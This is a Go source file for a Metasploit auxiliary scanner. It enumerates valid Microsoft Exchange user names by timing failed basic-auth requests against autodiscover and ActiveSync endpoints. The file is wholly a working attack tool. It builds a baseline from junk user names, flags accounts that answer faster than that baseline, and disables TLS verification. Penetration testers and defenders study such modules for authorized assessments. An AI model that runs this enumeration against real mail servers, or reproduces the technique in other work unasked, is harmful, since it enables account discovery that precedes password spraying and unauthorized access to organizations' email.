//usr/bin/env go run "$0" "$@"; exit "$?"

package main

import (
	"crypto/tls"
	"metasploit/module"
	"msmail"
	"net/http"
	"sort"
	"strconv"
	"sync"
	"time"
)

func main() {
	metadata := &module.Metadata{
		Name:        "On premise user enumeration",
		Description: "On premise enumeration of valid exchange users",
		Authors:     []string{"poptart", "jlarose", "Vincent Yiu", "grimhacker", "Nate Power", "Nick Powers", "clee-r7"},
		Date:        "2018-11-06",
		Type:        "single_scanner",
		Privileged:  false,
		References:  []module.Reference{},
		Options: map[string]module.Option{
			"USERNAME":   {Type: "string", Description: "Single user name to do identity test against", Required: false, Default: ""},
			"USER_FILE":  {Type: "string", Description: "Path to file containing list of users", Required: false, Default: ""},
		}}

	module.Init(metadata, run_onprem_enum)
}

func run_onprem_enum(params map[string]interface{}) {
	userFile := params["USER_FILE"].(string)
	userName := params["USERNAME"].(string)
	host := params["rhost"].(string)
	threads, e := strconv.Atoi(params["THREADS"].(string))
	if e != nil {
		module.LogError("Unable to parse 'Threads' value using default (5)")
		threads = 5
	}

	if threads > 100 {
		module.LogInfo("Threads value too large, setting max(100)")
		threads = 100
	}

	if userFile == "" && userName == "" {
		module.LogError("Expected 'USER_FILE' or 'USERNAME' field to be populated")
		return
	}

	var validUsers []string
	avgResponse := basicAuthAvgTime(host)
	if userFile != "" {
		validUsers = determineValidUsers(host, avgResponse, msmail.ImportUserList(userFile), threads)
	} else {
		validUsers = determineValidUsers(host, avgResponse, []string{userName}, threads)
	}

	msmail.ReportValidUsers(host, validUsers)
}

func determineValidUsers(host string, avgResponse time.Duration, userlist []string, threads int) []string {
	limit := threads
	var wg sync.WaitGroup
	queue := make(chan string)

	/*Keep in mind you, nothing has been added to handle successful auths
	  so the password for auth attempts has been hardcoded to something
	  that is not likely to be correct.
	*/
	pass := "Summer2018978"
	internaldomain := msmail.HarvestInternalDomain(host, false)
	url1 := "https://" + host + "/autodiscover/autodiscover.xml"
	url2 := "https://" + host + "/Microsoft-Server-ActiveSync"
	url3 := "https://autodiscover." + host + "/autodiscover/autodiscover.xml"
	var urlToHarvest string
	if msmail.WebRequestCodeResponse(url1) == 401 {
		urlToHarvest = url1
	} else if msmail.WebRequestCodeResponse(url2) == 401 {
		urlToHarvest = url2
	} else if msmail.WebRequestCodeResponse(url3) == 401 {
		urlToHarvest = url3
	} else {
		module.LogInfo("Unable to resolve host provided to determine valid users.")
		return []string{}
	}
	var validusers []string
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	for i := 0; i < limit; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			for user := range queue {
				startTime := time.Now()
				msmail.WebRequestBasicAuth(urlToHarvest, internaldomain+"\\"+user, pass, tr)
				elapsedTime := time.Since(startTime)

				if float64(elapsedTime) < float64(avgResponse)*0.77 {
					module.LogGood(user + " - " + elapsedTime.String())
					validusers = append(validusers, user)
				} else {
					module.LogError(user + " - " + elapsedTime.String())
				}
			}
		}(i)
	}

	for i := 0; i < len(userlist); i++ {
		queue <- userlist[i]
	}

	close(queue)
	wg.Wait()
	return validusers
}

func basicAuthAvgTime(host string) time.Duration {
	internaldomain := msmail.HarvestInternalDomain(host, false)
	url1 := "https://" + host + "/autodiscover/autodiscover.xml"
	url2 := "https://" + host + "/Microsoft-Server-ActiveSync"
	url3 := "https://autodiscover." + host + "/autodiscover/autodiscover.xml"
	var urlToHarvest string
	if msmail.WebRequestCodeResponse(url1) == 401 {
		urlToHarvest = url1
	} else if msmail.WebRequestCodeResponse(url2) == 401 {
		urlToHarvest = url2
	} else if msmail.WebRequestCodeResponse(url3) == 401 {
		urlToHarvest = url3
	} else {
		module.LogInfo("Unable to resolve host provided to determine valid users.")
		return -1
	}

	//We are determining sample auth response time for invalid users, the password used is irrelevant.
	pass := "Summer201823904"
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	module.LogInfo("Collecting sample auth times...")

	var sliceOfTimes []float64
	var medianTime float64

	usernamelist := []string{"sdfsdskljdfhkljhf", "ssdlfkjhgkjhdfsdfw", "sdfsdfdsfff", "sefsefsefsss", "lkjhlkjhiuyoiuy", "khiuoiuhohuio", "s2222dfs45g45gdf", "sdfseddf3333"}
	for i := 0; i < len(usernamelist)-1; i++ {
		startTime := time.Now()
		msmail.WebRequestBasicAuth(urlToHarvest, internaldomain+"\\"+usernamelist[i], pass, tr)
		elapsedTime := time.Since(startTime)
		if elapsedTime > time.Second*15 {
			module.LogInfo("Response taking longer than 15 seconds, setting time:")
			module.LogInfo("Avg Response: " + time.Duration(elapsedTime).String())
			return time.Duration(elapsedTime)
		}
		if i != 0 {
			module.LogInfo(elapsedTime.String())
			sliceOfTimes = append(sliceOfTimes, float64(elapsedTime))
		}
	}
	sort.Float64s(sliceOfTimes)
	if len(sliceOfTimes)%2 == 0 {
		positionOne := len(sliceOfTimes)/2 - 1
		positionTwo := len(sliceOfTimes) / 2
		medianTime = (sliceOfTimes[positionTwo] + sliceOfTimes[positionOne]) / 2
	} else if len(sliceOfTimes)%2 != 0 {
		position := len(sliceOfTimes)/2 - 1
		medianTime = sliceOfTimes[position]
	} else {
		module.LogError("Error determining whether length of times gathered is even or odd to obtain median value.")
	}
	module.LogInfo("Avg Response: " + time.Duration(medianTime).String())
	return time.Duration(medianTime)
}


